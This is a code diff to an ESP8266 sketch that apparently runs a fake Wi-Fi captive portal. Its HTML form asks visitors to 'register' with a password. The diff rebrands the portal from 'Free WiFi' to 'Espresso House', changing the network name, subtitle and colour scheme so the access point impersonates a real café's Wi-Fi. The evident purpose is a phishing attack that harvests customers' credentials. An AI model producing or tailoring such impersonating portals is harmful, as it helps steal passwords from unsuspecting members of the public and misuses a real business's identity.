@@ -4,8 +4,8 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Free WiFi"
-#define SUBTITLE "Welcome to free wifi service."
+#define SSID_NAME "Espresso House"
+#define SUBTITLE "Welcome to Espresso House service."
 #define TITLE "Register:"
 #define BODY "Create an account to get connected to the internet."
 #define POST_TITLE "Validating..."
@@ -31,7 +31,7 @@ String input(String argName) {
 
 String footer() {
   return
-    "<br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
+    "<br><footer><div><center><p>Copyright&#169; 2019-2022 | All rights reserved.</p></center></div></footer>";
 }
 
 String header(String t) {
@@ -41,10 +41,10 @@ String header(String t) {
                "div { padding: 0.5em; }"
                "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
                // Data input box
-               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #08B794; }"
+               "input{ width: 100%; padding: 12px 20px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 2px solid #7A5F25; }"
                "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
                //  Free WiFi Navbar
-               "nav { background: #08B794; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
+               "nav { background: #7A5F25; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
                "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
                "textarea { width: 100%; }"
                " input{width: 100%;border-box border: 2px solid red;border-radius: 4px}";
@@ -67,7 +67,7 @@ String index() {
          "<b> Password:</b> <center> <input type=password name=password placeholder=password></center>" +
          "<p>&#9745;I have read and agree to the Privacy Policy</p>" +
          //SUBMIT
-         "<center><input type=submit  style=background:#08B794;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();
+         "<center><input type=submit  style=background:#7A5F25;font-size:17px;color:white;cursor:pointer;  value=\"Register\"></center></form>" + footer();
 
 }
 
